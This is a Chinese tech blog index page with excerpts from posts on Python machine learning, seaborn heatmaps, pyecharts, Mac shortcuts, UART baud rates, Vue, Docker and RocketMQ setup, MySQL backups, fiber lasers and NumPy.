值得一提的是第二版在第一版的基础上增加了不少新的内容，完整的书籍目录如下：
下面是翻译过来的中文目录：
1. 赋予计算机从数据中学习的能力
2. 训练机器学习分类算法
3.使用Scikit-Learn的机器学习分类器之旅
4. 建立良好的培训集-数据预处理
5. 通过降维压缩数据
6. 学习模型评估和超参数优化的最佳实践
7. 结合不同的模型进行集成学习
8. 将机器学习应用于情绪分析
9. 将机器学习模型嵌入到Web应用程序中
10. 用回归分析预测连续目标变量
11. 处理未标记的数据-聚类分析
12. 实现了一个多层人工神经网络从无到有
13. 神经网络训练与张力流并行化
14. 更深入:张力流的力学
15. 利用深度卷积神经网络对图像进行分类
16. 利用递归神经网络对序列数据进行建模
根据书籍配套的代码
值得高兴的是，作者 Sebastian Raschka 开源了《Python 机器学习》第二版的所有章节中的 Python 代码，放在了 GitHub 仓库中。
源码地址：
https://github.com/rasbt/python-machine-learning-book-2nd-edition
目前，该 GitHub 项目已经获得 4000+ 的 star 了，热度很高。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/482cb262b9fe3c55061b4e53b5844c21/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d89496a7542d6e135e72a64297bdc33/" rel="bookmark">
			python画相关性可视化图_Python可视化matplotlib&amp;seborn16-相关性热图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文速览普通相关性heatmap聚类相关性heatmap
本文将了解到什么？
1、数据准备
2、seaborn.heatmap绘制correlation heatmap
默认参数绘制correlation heatmap
vmax设置颜色深浅
cmp参数变换colormap
annot、fmt、annot_kws设置格子中文本
mask设置部分数据显示
3、seaborn.clustermap绘制correlation clustermap
1、数据准备
关键一步，使用pandas的corr函数生成相关矩阵。
from string import ascii_letters
import numpy as np
import pandas as pd
import seaborn as sns
import matplotlib.pyplot as plt
import palettable
# 生成随机数
rs = np.random.RandomState(33)#类似np.random.seed，即每次括号中的种子33不变，每次可获得相同的随机数
d = pd.DataFrame(data=rs.normal(size=(100, 26)),#normal生成高斯分布的概率密度随机数，需要在变量rs下使用
columns=list(ascii_letters[26:]))
# corr函数计算相关性矩阵(correlation matrix)
dcorr = d.corr(method='pearson')#默认为'pearson'检验，可选'kendall','spearman'
简单看下原始数据集，如下：可以简单理解为一个具有26个变量（A-Z）,每个变量具有100个平行的矩阵。
经过corr函数变换后 ，变成26x26的方形矩阵。
2、seaborn.heatmap绘制correlation heatmap
默认参数绘制correlation heatmap
plt.figure(figsize=(11, 9),dpi=100)
sns.heatmap(data=dcorr,
)
vmax设置颜色深浅
plt.figure(figsize=(11, 9),dpi=100)
sns.heatmap(data=dcorr,
vmax=0.3, #上图颜色太深，不美观，让整体颜色变浅点
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6d89496a7542d6e135e72a64297bdc33/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae87ea086530d1da8fb48859c7224983/" rel="bookmark">
			利用python计算圆球的体积_python中球体的体积
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		您必须更改：volume = math.pi(n/2)^2/math.gamma(n/2 + 1)
收件人：
^{pr2}$
完整代码：import math
dimension = input("Enter dimension: ")
print("dimension: " + str(dimension))
n = float(dimension)
volume = math.pi**(n/2)/math.gamma(n/2 + 1)
print("Volume: " + str(round(volume,4)))
输入：Enter dimension: 3
输出：dimension: 3
Volume: 4.1888
附加：import math
import matplotlib.pyplot as plt
x = []
y = []
for dimension in range(100):
n = float(dimension)
volume = math.pi**(n/2)/math.gamma(n/2 + 1)
x.append(n)
y.append(volume)
plt.plot(x, y)
plt.show()
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c012c75080944698fb793a6a89369844/" rel="bookmark">
			python 柱状图宽度设置_pyecharts中，柱形图宽度如何设置？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		添加bar_category_gap字段控制柱形宽度。例：
宽度太宽了，添加bar_category_gap=‘50%’
顺眼多了，还需要调整的话改变你百分比即可，百分比越大，宽度越窄。
附上其他常用字段：
#常用的参数（可以在add()中设置，实现各种需求）
is stack：是否堆积
is convert：x,y轴是否交换
is_legend_show:是否显示图例
legend_orient：图列方向，有'horizontal'（默认水平显示），'vertical'（垂直）可选
legend_pos：图例位置，有'left', 'center'（默认）, 'right'可选
legend_text_size/color：图例名称字体大小/颜色
is_x/yaxis_show：是否显示x/y轴
x/yaxi0s_interval：x/y轴标签的显示间隔
x/yaxis_min/max：x/y轴刻度最小值/最大值
x/yaxis_label_textsize/textcolor：x/y轴标签字体大小/颜色
xaxis_rotate：x轴标签旋转角度
is_splitline_show：是否显示网格线
is_label_show：是否显示标签
label_pos：标签的位置，有'top'(默认), 'left', 'right', 'bottom', 'inside','outside'可选
label_text_color/size：标签字体颜色/大小
is_random：是否随机排列颜色列表
label_color：自定义标签颜色
mark_point/line：标记点/线，默认有'min', 'max', 'average'可选。可自定义标记点线，具体格式如：[{'coord': [x, y], 'name': '目标标记点'}]，记住格式是一个列表
mark_point/line_symbol：标记点/线图形，默认为'pin'（点），有'circle'（圆形）, 'rect'（正方形）, 'roundRect'（圆角正方形）, 'triangle'（三角形）, 'diamond'（菱形）, 'pin'（点）, 'arrow'（箭头）可选
mark_point/line_symbolsize：标记点/线图形大小
mark_point/line_textcolor：标记点/线字体颜色
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ce99c07da049b1a7a7b4011bafcdbdc/" rel="bookmark">
			macbook剪切粘贴快捷键_掌握这些mac快捷键，效率提升不止10倍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天macw小编跟大家分享一些常用的 Mac 快捷键，希望对大家有帮助。快捷键很多，只需要记住你经常用到的就行。能用快捷键就尽量不用鼠标，效率会提升很多。
KeyCue for mac(快捷键辅助工具)​www.macw.com 访达（Finder）快捷键
1. 空格：快速查看文件
这是 Mac 系统独有的神键，在访达中，选中一个文件，按一下空格键，就可以快速查看这个文件。比如查看图片、播放音/视频、预览文档等，你还可以点击右上角的选项，对图片进行旋转、标注，对音/视频进行修剪等操作。
如果想查看多个文件，可以选中这些文件，然后按空格键，再按「向下键」来依次查看。同理，如果想查看一个文件夹里面的所有文件，选中第一个文件，按空格，再配合上下键来浏览，非常方便。
2. command - delete：删除文件
在访达中选中文件，按 command-delete，可以把文件移到废纸篓，这并不是从磁盘上完全删除。如果要完全删除，还需要清倒废纸篓。
3. command - option - delete：完全删除文件
选中文件，按下这组快捷键，会直接将文件从磁盘完全删除，而不是移到废纸篓。如果是确定要完全删除的文件，可以直接使用这个快捷键，可省去清倒废纸篓的步骤。
4. command- i：显示简介
选中一个文件，按 command - i，就会显示该文件的各项信息，比如文件大小、文件所在的位置、创建和修改时间、打开方式、权限等。如果是软件，还可以查看它的版本号。
5. command - E：推出磁盘
相当于点击访达磁盘右边的推出按钮，比如你插入一个 U 盘或者打开一个以 dmg 磁盘形式封装的软件安装包，它一般会显示在「访达」-「位置」下面，用完 U盘或者装完软件后，想推出这个磁盘，就可以在磁盘当前窗口或者在访达里面选中磁盘，按 command - E。
Safari 快捷键（其他浏览器也通用）
1. command - T ：新建标签页
相当于点击浏览器右上角的加号。
2. command - R：刷新网页
相当于在网页上单击右键 - 重新加载。
3. command - D：收藏网页
刷到喜欢或者需要经常访问的网页，可以按下这组快捷键，将网页收藏到书签。
系统快捷键 1. command - control - 空格：唤出 emoji 表情符号
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ce99c07da049b1a7a7b4011bafcdbdc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/14c9f8836125abb7ec3ce63c03433179/" rel="bookmark">
			NXP JN5169 UART波特率问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		被NXP JN5169的UART收数据大批量错误坑了一把，最后发现是NXP的速率计算因子误差太大导致。
写了个程序，把所有常见的波特率匹配了一把，匹配的结果（相对误差在千分之七以下）即波特率的计算因子建议值如下：
ratio=0.007000
Divisor=414 Cpb=15 rate=2415 target=2400 error=1.006250
Divisor=415 Cpb=15 rate=2409 target=2400 error=1.003750
Divisor=416 Cpb=15 rate=2403 target=2400 error=1.001250
Divisor=417 Cpb=15 rate=2398 target=2400 error=0.999167
Divisor=418 Cpb=15 rate=2392 target=2400 error=0.996667
Divisor=419 Cpb=15 rate=2386 target=2400 error=0.994167
Divisor=442 Cpb=14 rate=2413 target=2400 error=1.005417
Divisor=443 Cpb=14 rate=2407 target=2400 error=1.002917
Divisor=444 Cpb=14 rate=2402 target=2400 error=1.000833
Divisor=445 Cpb=14 rate=2397 target=2400 error=0.998750
Divisor=446 Cpb=14 rate=2391 target=2400 error=0.996250
Divisor=447 Cpb=14 rate=2386 target=2400 error=0.994167
Divisor=473 Cpb=13 rate=2416 target=2400 error=1.006667
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/14c9f8836125abb7ec3ce63c03433179/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5bb6ce3a5cd15dd19444b000121681fe/" rel="bookmark">
			VUE如何关闭Eslint 的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在家里面创建vue项目的时候，手一抖把Use ESLint to lint your code?(Y/N) 选择了Y，然后到写代码的时候，虽然说是浏览器完全能运行结果，但是在cmd就是一直报错。强迫症没有办法。所以大家安装的时候最好选择N.
如果不小心选择错了没有关系的，下面就是解决办法，
一)在你的项目中找到build-----&gt;webpack.base.conf.js文件
二)找到如下代码块，注释就OK了
三）重启开发工具，然后npm run dev 就开始你的代码了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8cb5c798aace4400c8d0cbf9f3f5363/" rel="bookmark">
			vue form validate 多个input_Vue 面向对象编程 - 综合运用 - 表单
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前的例子简单地说明了以下面向对象在 Vue 中的应用
很多人有不同意见，原因很简单，clipboard 返回的是单层对象，其实这种服务用原型也可以：
function 单层对象不会对类型声明造成太多影响，原型模式也是设计模式的一种，因此这种写法应对这种问题我也是支持的
但是接下来要讲的问题，不用面向对象，复杂度是直线上升的，我搞出这个来只用了20分钟左右，大家可以试试不用面向对象，在ts环境下需要多少时间
大家都用惯了 element-ui 了是么?
element-ui 有个表单组件：
// 模板中 同样一个数据实体，在表单中绑定了太多次了
我们今天来看看新的 api 下，Vue 能够办到什么样的用法？
还是 script 优先的写法，原因见之前的文章
所有逻辑，交给组件，你别瞎忙活 你的组件内部，无逻辑 能否实现双向绑定和 model 导出呢？
可以的，怎么配合 面向对象 + SOA 实现呢？
这个问题比之前的 clipboard 要复杂，可能出现嵌套结构，之前的问题可以采用原型对象，这个问题不行，直接上极限面向对象
React 的话，推荐 useReducer，invoker 本身就是函数式模拟部分面向对象概念集成的东西，我反对的是全局统一命令模式跨平台，不反对 invoker state monad 但是 Vue 强烈反对用 vuex 或者相关技术 pania 之类，没有不变性约束，你用这个真的会炸 首先介绍给大家的是
抽象类 大家自行百度哈，网上相关解释太多了，编程界工程技术占100，面向对象独占 80
当然，抽象类现在收到了批判，很多人建议用 接口定义，抽象非具体，组合非继承，不过那都是后话，至少就这个问题的复杂度而言，我们先一步一步来 分析问题（想清楚是面向对象的第一要务，他只是翻译你心里的概念而已）
我们需要 FormItem， 也需要 FormFormItem 能自动绑定最近的 Form，但是如果有传入 Form 令牌，就绑定那个 Form 所在的令牌FormItem 可以通过自己的参数，修改 Form 的属性，比如 item 实例，model 等FormItem 需要自动为子组件加上绑定，这样可以让使用者负担最小化Form 需要对其下的 FormItem 有全权控制能力 可以，两个抽象类，Form：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d8cb5c798aace4400c8d0cbf9f3f5363/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62fb7f4d9b6be5320e04f3a5975968b3/" rel="bookmark">
			docker $PWD路径_Docker常用操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 以非root权限运行docker命令 1. 添加docker用户组，默认情况下安装好已经创建 $ sudo groupadd docker 2. 将用户加入该group $ sudo usermod -aG docker $USER # 或者使用下面命令 $ sudo gpasswd -a ${USER} docker 3. 重启服务 $ sudo service docker restart # 或者 $ sudo /etc/init.d/docker restart 4. 切换当前会话到新 group 或者重启 X 会话 注意:这一步是必须的，否则因为 groups 命令获取到的是缓存的组信息，刚添加的组信息未能生效，所以 docker images 执行时同样有错。 $ newgrp - docker 2. docker端口映射 docker run -p [宿主机端口号]:[docker内服务端口号] -d [镜像名称] 例如： docker run -p 8080:80 -d nginx:latest 该命令得作用是把docker内的80端口映射到宿主机的8080端口，-d表示以守护进程启动 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/62fb7f4d9b6be5320e04f3a5975968b3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65513de4c67bccc6985b5e37c449a14d/" rel="bookmark">
			python list元素换位置_Python的数据类型概述
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章中有小白没有叙述明白的欢迎大家给小白留言哟。 Python的基本数据类型主要分为两种，数值数据类型、字符串数据类型。除了这两种之外还有元组类型、集合类型、列表类型、字典类型等。 Ⅰ.数值数据类型(number)
表示数字或是数值的数据类型成为数字类型数据类型分为四种：
整数(int)：可用十进制(d)、十六进制(x)、八进制(o)、二进制(d)等不同进制形式。 浮点数(float)：可以表示带有小数点的一般形式，也可以用科学计数 法表示。 复数(complex)：复数类型与数学中的复数相一致，采用a+bj的形式表示，存在实部和虚部。 布尔型(bool)：判断表达式的真假，若为真则为1，若为假，则为0。 以上只是一些基础概念对于数据的操作可与数学中有一些区别！
(print()为Python中的输出函数，后续文章中详细解释)
Ⅱ.字符串数据类型(str)
字符串是一个有序字符的集合，用于存储和表示基本的文本信息，但是只能存放一个值，一经定义，不可改变。 是用两个双引号""或者两个单引号''括起来，同时使用反斜杠\转义特殊字符的一个或多个字符。 字符串的截取：变量[头下标:尾下标] 咚咚咚 敲黑板了，中括号里面的取值范围可是“左闭右开”的。既包含头下标的字符，不包含尾下标的字符。 索引值以0为开始值，-1为从末尾的开始位置，如下所示
加号+是字符串的连接符，星号*表示复制当前字符串，紧跟的数字为复制的次数。 Python 使用反斜杠(\)转义特殊字符，如果你不想让反斜杠发生转义，可以在字符串前面添加一个 r，表示原始字符串。 我们通过下面的列子一起来学习一下对字符串的操作，小白认为很有趣哦。 Python 使用反斜杠(\)转义特殊字符，如果你不想让反斜杠发生转义，可以在字符串前面添加一个 r，表示原始字符串 Ⅲ.元组类型
元组的创建：元组的定义通常是由逗号分隔,或由圆括号括住的一个序列
元组的访问和切片：通过单个索引可以获得该索引位置的元素，但是只能读，不能修改。通过切片可以获得由若干个元素构成的子元组。
元组操作符：+ 用于合并元组，* 用于重复元组
删除整个元组：用del 元组名来删除整个元组
元组的函数与方法：在列表的函数和方法中，除append,extend和insert这三个方法之外，其他的函数和方法都可以用于元组
元组的创建
元组的创建语法 定义由逗号分隔，或用圆括号括起来一个序列，元组内的数据类型可以不一致。圆括号也可以省略，示例如下
需要注意的是，当元组只有一个元素时，需要在元素后面添加逗号，否则括号会被当做运算符使用，如下示例 元组的访问
元组的访问和字符串的访问一样，都是通过下标索引来进行访问，如下所示 元组的修改
元组为不可变类型，即一经定义，不可修改。但是我们可以换一种思路，通过元组的截取、元组与元组之间的连接来形成新的元组，示例如下 元组的删除
由于元组为不可变类型，我们不能删除元组内的值，但我们可以通过del语句来删除整个元组。我们删除上文中的tup4元组，若显示tup4元组不存在即删除成功，示例如下 元组的相关运算
“+”号为字符串连接符，如下所示连接tup1和tup2形成新的元组tup3,在元组的修改中已有相关实验，这里不再详述。 使用*号实现对元组的复制，*后面的数字是几就是复制几次，示例如下 判断元素，如下示例，我们判断某个元素是否存在于元组的内部，用in关键字，若存在返回真(Ture)，不存在返回假(False)。
元组的函数
求元组的长度，求元组的长度使用运算函数len(),求最大值用max()函数，最小值min()函数。示例如下
Ⅳ.列表类型
List(列表) 是 Python 中使用最频繁的数据类型。
列表可以完成大多数集合类的数据结构实现。列表中元素的类型可以不相同，它支持数字，字符串甚至可以包含列表(所谓嵌套)。
列表是写在方括号 [] 之间、用逗号分隔开的元素列表。(元组的圆括号可以省略，列表的方括号不可以省略。
列表和字符串一样，是可变数据类型，俗称Python的苦力。列表同样可以被索引和截取，列表被截取后返回一个包含所需元素的新列表。
列表的创建
列表创建的语法 列表名=[列表元素]
同一列表中的数据元素不一定相同，字符串需要用单引号或双引号引起的，如下示例
列表的简单操作
列表同字符串和元组一样，可以通过索引被截取。如下第一个示例。
列表的元素判断与元组不同，元组用的是关键字in,而列表用的是index()函数。如下第二个示例。
列表开始干苦力的地方来了，如下示例第三个和第四个分别是列表元素的追加(使用的是append()函数)，列表元素的移除(使用的是remove()函数)。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/65513de4c67bccc6985b5e37c449a14d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/266931a9eb8ffc5e6a18901bbc27c3bf/" rel="bookmark">
			mysql 备份表_做好mysql运维，必须熟练掌握备份和恢复，实战一次不行多来几次
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、 备份恢复策略 进行备份或恢复操作时需要考虑一些因素：
1、确定要备份的表的存储引擎是事务型还是非事务型，两种不同的存储引擎备份方式在处理数据一致性方面是不太一样的。
2、确定使用全备份还是增量备份。全备份的优点是备份保持最新备份，恢复的时候可以花费更少的时间；缺点是如果数据量大，将会花费很多的时间，并对系统造成较长时间的压力。增量备份相反，只需要备份每天的增量日志，备份时间少，对负载压力也小；缺点就是恢复的时候需要全备份加上次备份到故障前的所有日志，恢复时间长一些。
3、可以考虑采用复制的方法来做异地备份，但不能代替备份，它对数据库的误操作也无能为力。
4、要定期做备份，备份的周期要充分考虑系统可以承受的恢复时间。备份要在系统负载较小的时候进行
5、确保 MySQL 打开 log-bin 选项，有了 binlog，MySQL 才可以在必要的时候做完整恢复，或基于时间点的恢复，或基于位置的恢复。
6、经常做备份恢复测试，确保备份是有效的，是可以恢复的。
二、 逻辑备份和恢复 在 MySQL 中，逻辑备份的最大优点是对于各种存储引擎都可以用同样的方法来备份；而物理备份则不同，不同的存储引擎有着不同的备份方法，因此，对于不同存储引擎混合的数据库，逻辑备份会简单一点。
1. 备份 MySQL 中的逻辑备份是将数据库中的数据备份为一个文本文件，备份的文件可以被查看和编辑。在 MySQL 中，可以使用 mysqldump 工具来完成逻辑备份：
// 备份指定的数据库或者数据库中的某些表 shell&gt; mysqldump [options] db_name [tables] // 备份指定的一个或多个数据库 shell&gt; mysqldump [options] --database DB1 [DB2,DB3...] // 备份所有数据库 shell&gt; mysqldump [options] --all-database 如果没有指定数据库中的任何表，默认导出所有数据库中的所有表。
示例： 1. 备份所有数据库：
shell&gt;mysqldump -uroot -p --all-database &gt; all.sql 2. 备份数据库 test
shell&gt;mysqldump -uroot -p test &gt; test.sql 3. 备份数据库 test 下的表 emp
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/266931a9eb8ffc5e6a18901bbc27c3bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96669b46e6d286e39146b5f109c03a99/" rel="bookmark">
			Docker运行Rocket MQ
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 创建网络
docker network create -d bridge rocketmq 启动namesrv
docker run -itd --name rocketmq-namesrv --restart=always --network rocketmq -v /home/kareza/backup/rocketmq-namesrv/logs:/root/logs -p 9876:9876 rocketmq-namesrv:4.7.1-low-performance 启动broker
docker run -itd --name rocketmq-broker --restart=always --network rocketmq -v /home/kareza/backup/rocketmq-broker/logs:/root/logs -v /home/kareza/backup/rocketmq-broker/store:/root/store rocketmq-broker:4.7.1-low-performance 启动rocketmq-console-ng
docker run -itd --name rocketmq-console-ng -e "JAVA_OPTS=-Drocketmq.namesrv.addr=rocketmq-namesrv:9876 -Dcom.rocketmq.sendMessageWithVIPChannel=false" -p 8080:8080 kareza/rocketmq-console-ng:4.7.1 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16ac7d65f96d4076bbc82e40ab59c2d5/" rel="bookmark">
			现代通信技术三个领域_单频光纤激光技术在激光遥感、激光通信及冷原子物理等前沿科技领域的应用浅析...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		光纤激光技术，作为固体激光技术的重要补充，近年来在众多科研和工业制造领域已充分展示其独特的应用优势和广泛应用前景。“单频光纤激光”，简单从字面上解读，“单频”即要求光辐射频谱纯净，噪声低，相干性好。可以通过激光线宽、相对强度/相位/频率噪声谱、光谱边模抑制比、扫描干涉波形、长程干涉计量等测量表征手段来衡量指标。“光纤”，即激光器内部采用全光纤链路熔接，光束传输不依赖传统自由空间光学器件，无需光路调整结构。
科研领域激光系统工程化应用，除了以单频性能为代表的常规光学技术指标需求，对系统长期可靠性、免维护性、环境干扰脱敏等方面，也提出了更高要求。科研领域常用的单频光纤激光系统，可采用“主振荡器+功率放大(MOPA)”形式，前端一般由单频低噪种子源激光器产生单频窄线宽低噪连续光源，光调制器件(如光纤耦合声光调制器、电光强度/相位/IQ调制器、半导体光放大器等)可以进行附加的光信号幅频相调制、脉冲斩波等，后端一般采用级联多个光纤放大级，实现功率/能量的提升。这种MOPA形式，使激光的波长/频率、脉冲参数(重复频率、脉冲宽度、波形)、功率/能量等参数控制相互独立，操控灵活。激光器内部各种功能器件之间连接全部采用光纤柔性熔接，对振动、湿度、温度、噪声等环境干扰因素不敏感，免维护，辅之以适当的宽温可靠性、功耗集约、结构强化设计，可适应机载、长途搬运、外场等复杂工况环境应用。
以下结合南京先进激光技术研究院近5年来承担的较为典型的相关工程化项目产品案例，浅析单频光纤激光技术在若干前沿科技领域的工程化应用。
案例1：相干多普勒测风激光雷达用宽温工作1.5um单频脉冲光纤激光器。系统基于相干差拍探测原理，主要面向中长程(＞5km)测风应用，单频种子源线宽一般在10kHz量级或更窄，以保证足够的相干长度。脉冲重频一般10kHz量级，脉宽范围一般几百ns，单脉冲能量最高~300uJ左右(对应重频10kHz、脉宽500ns)。调制器件一般选用光纤耦合声光调制器，既实现脉冲斩波，同时移频量也确定了相干差拍中频(IF)。具体声光驱动频率由设计风速测量范围确定，典型值80±40MHz，具体选型时可以考虑以下因素。相干探测带宽一般＜300MHz居多，声光射频驱动器的谐波过高会带来潜在异常频谱干扰，除了选用谐波抑制比高、关断比高的射频驱动器外，可适当提高载频，使探测带宽内谐波频率成分尽可能少。实际应用中，常用2个声光调制器(AOM)级联，同步触发，脉宽、相对延迟可调，前一个AOM用于脉冲成形，后一个AOM进一步提高脉冲动态消光比，抑制光放大过程引入的底噪。两个声光调制器移频方向可以一致，也可以正负移频组合。多级光纤放大器设计上，长脉冲饱和放大过程中的波形畸变(脉宽＞放大器渡越时间，脉冲时域动态增益引起)和背向受激布里渊散射(SBS)效应，是面临的主要问题。前者可以通过AOM脉冲成形时波形编辑预补偿、级间增益合理分配来弥补，后者除了尽量减少传能光纤长度外，增益光纤施加适当纵向应力/温度梯度有显著提升SBS效应阈值的效果。同时采用大模场增益光纤，增加模场面积，辅之以合适的盘绕直径，增大高阶横模损耗，可降低高峰功下横模干涉效应的影响。-40℃~+50℃的宽温应用要求，需要工程设计上对温敏器件(比如光电探测器的暗电流噪声温度相关，调制器件、激光二极管等长期工作寿命考虑)做局部保护，优化整机内部关键控温点或模块的温度反馈控制，同时需保障高/低温极限下系统峰值功耗不宜过高。
案例2：空间激光通信用1550nm连续波高功率单频窄线宽光纤放大器。本项目针对窄线宽(线宽＜5kHz)、低功率(10mW左右)高速调制种子源光信号进行连续放大，终端输出功率20W左右。为控制输出光束质量和模式，没有使用大模场(LMA，纤芯直径＞15um)增益光纤。MOPA形式的功率放大级，泵浦波长为940nm，反向泵浦。相较于976nm，增益光纤包层泵浦吸收虽然减弱，光纤长度增加，但单位长度热负载分布更合理。对1.5um波段高功率单频放大器，一般采用铒镱共掺光纤作为放大介质，1um波段放大自发辐射(ASE)可通过优化光纤长度、波分复用器件析出，同时注意光纤器件熔点的熔接质量控制，防止高增益下光纤链路内的自激振荡。多级放大器功率提升过程引入的噪声，除了放大级间熔接带通滤波器、隔离器外，利用饱和放大器自身频率响应特性抑制特定频段噪声，合理分配增益，改善泵浦电子学噪声，在线主动光功率反馈控制，都能有效提升整体性能。采用上述方式，主功率放大级的泵浦转换效率优于40%，光功率稳定性优于0.6%(RMS，100小时，20W)，相对强度噪声(RIN)没有明显恶化。
案例3：原子冷却用全光纤链路780nm和1064nm单频保偏光纤激光器。780nm激光器主要作为铷87原子的玻色-爱因斯坦凝聚(BEC)实验所需冷却光(Cooling)、重泵浦光(Repump)、探测光(Probe)光源，参考频率锁定在原子吸收谱超精细分裂峰处(87Rb D2线，谱线自然线宽＜10MHz，连续锁定时间优于24小时，失锁可自恢复)，可扫频、跳频，各路激光可独立快速关断。区别于通行的780nm外腔半导体种子源+锥形放大器(TA)形式，全光纤链路采用“基频1560nm→光纤放大→倍频780nm”方案，利用1.5um光通信波段各种有源、无源功能器件成熟可靠的优势。不同功能激光束的频率控制在基频1560nm波段实现，宽带光电探测器结合光学锁相反馈环路控制，可完成多路激光间GHz以上量级偏置频率锁定、频点跳变、小范围扫频等功能。稳频方式可采用饱和吸收或调制转移谱，单频半导体DFB激光器(线宽百kHz量级)的驱动电流、温度作为PID反馈控制参量，对外界振动敏感性低，工作点长期稳定，系统鲁棒性较好。不同功能光束的实时开关操控，可选用合适的具备高关断比开关性能光电器件(电光强度调制器、声光调制器、半导体光放大器、光开关等)，和光纤放大器泵浦电流联动控制的方式。前者高速、高关断比、低损伤阈值，后者慢速、低关断比、高损伤阈值，程控时序设计上，需注意避免光纤放大器输入阈值监测异常或保护失效烧坏放大器。输出光功率起伏的短期稳定性(@1s)，通过输出端在线耦合分光监测，快速光功率反馈环路控制实现。实测输出光功率近1W@780nm，关断比优于75dB(@1560nm)、关断时间＜150us(探测光约10us)，光功率起伏＜1% (RMS，2小时)，偏振消光比优于20dB。1064nm激光器可作为大失谐光偶极势阱光源，设计要求多路分束基础上，势阱深度可大动态范围绝热操控。整机设计思路上，仍采用MOPA形式提升单路输出功率，光场幅度的大动态范围模拟控制通过声光调制器驱动射频功率(电光强度调制器亦可，损伤阈值较低)、光纤放大器泵浦电流的联动控制来实现。输出光幅度控制、光纤放大器输入保护时序设计上，同780nm激光器一样，不再赘述。实测输出单路光功率＞5W(原则上可以更高)，光谱边模抑制比优于50dB，光功率波动优于1.0×10-4@1s(＜1%，RMS @ 1小时)，偏振消光比优于20dB。光场幅度模拟控制动态范围优于60dB，绝热变化总时长10s左右，可自定义控制曲线(外部触发延迟不超过1ms)。上述激光器设计思路既可应用于常规实验室级超冷原子物理实验平台，更适合可靠性和集成度要求高的应用场合，如基于量子干涉效应的地面或机载可搬运冷原子重力仪、原子钟等。
以上工程化激光系统项目应用案例，利用1um、1.5um波段单频光纤激光技术，辅之以激光频率/相位控制(稳频、锁相)、幅度控制(光脉冲整形、幅度模拟控制、在线实时光功率反馈控制)等技术手段，结合工程化机电可靠性设计，可实现不同科研领域、应用场景、设计目标的多功能系统需求，体现了单频光纤激光技术在前沿科技领域应用的高度灵活性、可靠性、扩展性。
作者简介：钱勇，中科大博士，现就职于南京先进激光技术研究院先进全固态中心。固态中心光纤组“五虎将”之首，多年来致力于单频光纤技术方面的研发及应用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b30ee9cd2c6d86edb3ec1495c4b09fca/" rel="bookmark">
			numpy 创建加一行_图解Numpy精翻版，一文带你入门Python数据处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文精心翻译自Jay Alammar的博客：https://jalammar.github.io/visual-numpy/，其用图解的方式详细介绍了 NumPy的功能和使用示例。
NumPy 是 Python 生态中数据分析、机器学习和科学计算的基础。它极大地简化了向量和矩阵的操作处理。Python 的一些主要软件包(如 scikit-learn、SciPy、pandas 和 tensorflow)都以 NumPy 作为其架构的基础部分。除了能对数值数据进行切片(slice)和切块(dice)之外，使用 NumPy 还能为处理和调试上述库中的高级实例带来极大的便利。
本文将介绍 NumPy 的一些主要方法，以及在将数据送入机器学习模型之前，numpy是如何表示不同类型数据(表格、图像、文本等)的。
import numpy as np 创建数组
通过传递一个 python 列表，并使用 np.array()来创建 NumPy 数组。python 创建的数组如下图右所示：
NumPy 提供了一些初始化数组的方法，例如 ones()、zeros() 和 random.random() 等方法。只要传递希望 NumPy 生成的元素维数即可：
一旦创建了数组，就可以随意操作啦。
数组运算 下面创建两个 NumPy 数组来展示数组运算功能。下图两个数组分别为 data 和 ones：
将它们按位置相加(即每行对应相加)，直接输入 data + ones 即可：
除了加，还可以进行如下操作：
